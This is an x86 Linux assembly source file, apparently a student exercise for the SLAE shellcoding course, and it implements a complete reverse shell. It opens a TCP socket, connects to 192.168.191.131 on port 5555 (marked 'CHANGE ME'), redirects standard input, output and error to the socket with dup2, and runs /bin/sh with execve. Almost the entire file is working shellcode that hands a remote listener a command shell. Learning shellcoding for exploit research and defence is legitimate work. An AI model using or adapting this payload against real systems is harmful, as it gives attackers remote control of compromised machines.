;
; Purpose: SLAE Course
; Student ID: SLAE-998 
;

global _start

section .text
_start:

	; socket
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	push eax	; push 0 IPPROTO_IP
	mov al, 0x66	; socketcall
	mov bl, 0x1	; sys_socket
	push byte 0x1	; push 1 SOCK_STREAM
	push byte 0x2	; push 2 AF_INET
	mov ecx, esp	; ecx points to memory
	int 0x80	; make the sys call

	; connect
	mov edx, eax	; sockfd
	xor eax, eax	; clear eax
	mov ebx, eax	; clear ebx
	mov al, 0x66	; xor eax,eax + socketcall
	mov bl, 0x3	; sys_connect

	push dword 0x83bfa8c0	; ip address 192.168.191.131 - 	# CHANGE ME
	push word 0xb315	; port 5555		     -	# CHANGE ME
	push word 0x2		; AF_INET = PF_INET = 2
	mov ecx, esp		; pointer to struct - second argument

	push 0x10	; addrlen = 16
	push ecx	; pointer to struct
	push edx	; sockfd

	mov ecx, esp	; pointer to arguments
	int 0x80	; make the sys call

	; dup2
	pop ebx		; sockfd to ebx 
	xor ecx, ecx	; clear counter
	mov cl, 0x2	; initialize counter

	loop:
		mov al, 0x3f	; sys call dup2
		int 0x80	; make the sys call
		dec cl		; decrement counter
		jns loop

	; execve
	xor ecx, ecx	; clear register - second argument
	mul ecx		; clear eax, edx 

	push eax		; null after string
	push dword 0x68732f6e	; n/sh
	push dword 0x69622f2f	; //bi

	mov ebx, esp	; point to //bin/sh in stack

	mov al, 0xb	; execve sys call
	int 0x80	; make sys call
